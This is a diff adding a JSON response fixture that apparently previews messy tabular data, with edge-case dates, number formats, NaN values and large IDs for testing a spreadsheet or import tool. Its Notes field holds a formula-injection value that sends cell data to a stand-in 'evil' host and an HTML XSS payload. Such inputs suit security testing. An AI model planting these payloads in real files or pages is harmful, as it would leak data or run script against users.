@@ -1,0 +1,93 @@
+{
+ "json": {
+  "preview": [
+   {
+    "Account": 1000.0,
+    "Amount": -300.0,
+    "BigId": 9007199254740993,
+    "Calc": 2000.0,
+    "Date": "Mon, 01 Jan 2024 00:00:00 GMT",
+    "DateText": "01/02/2024",
+    "Email": "alice0@example.com",
+    "EuroNum": "2,5",
+    "Flag": true,
+    "ID": "PR-00001",
+    "Name": "Alice",
+    "Notes": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+    "Pct": "50%",
+    "Region": "N",
+    "Zip": 1000
+   },
+   {
+    "Account": 1001.0,
+    "Amount": -262.5,
+    "BigId": 9007199254740994,
+    "Calc": 2002.0,
+    "Date": "Tue, 02 Jan 2024 00:00:00 GMT",
+    "DateText": "2024-03-05",
+    "Email": NaN,
+    "EuroNum": "1.234,56",
+    "Flag": false,
+    "ID": "PR-00002",
+    "Name": "Bob",
+    "Notes": "x|||y",
+    "Pct": 0.5,
+    "Region": "S",
+    "Zip": 1007
+   },
+   {
+    "Account": 1002.0,
+    "Amount": -225.0,
+    "BigId": 9007199254740995,
+    "Calc": 2004.0,
+    "Date": "Wed, 03 Jan 2024 00:00:00 GMT",
+    "DateText": "13/02/2024",
+    "Email": "carol2@example.com",
+    "EuroNum": "10",
+    "Flag": true,
+    "ID": "PR-00003",
+    "Name": "Carol",
+    "Notes": "<img src=x onerror=alert(1)>",
+    "Pct": "12.5%",
+    "Region": NaN,
+    "Zip": 1014
+   },
+   {
+    "Account": 1003.0,
+    "Amount": -187.5,
+    "BigId": 9007199254740996,
+    "Calc": 2006.0,
+    "Date": "Thu, 04 Jan 2024 00:00:00 GMT",
+    "DateText": "01/02/2024",
+    "Email": "dave3@example.com",
+    "EuroNum": "2,5",
+    "Flag": false,
+    "ID": "PR-00004",
+    "Name": "Dave",
+    "Notes": "café",
+    "Pct": "50%",
+    "Region": "N",
+    "Zip": 1021
+   },
+   {
+    "Account": NaN,
+    "Amount": -150.0,
+    "BigId": 9007199254740997,
+    "Calc": NaN,
+    "Date": "Fri, 05 Jan 2024 00:00:00 GMT",
+    "DateText": "2024-03-05",
+    "Email": "alice4@example.com",
+    "EuroNum": "1.234,56",
+    "Flag": true,
+    "ID": "PR-00005",
+    "Name": "Alice",
+    "Notes": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+    "Pct": 0.5,
+    "Region": "S",
+    "Zip": 1028
+   }
+  ],
+  "success": true
+ },
+ "status": 200
+}
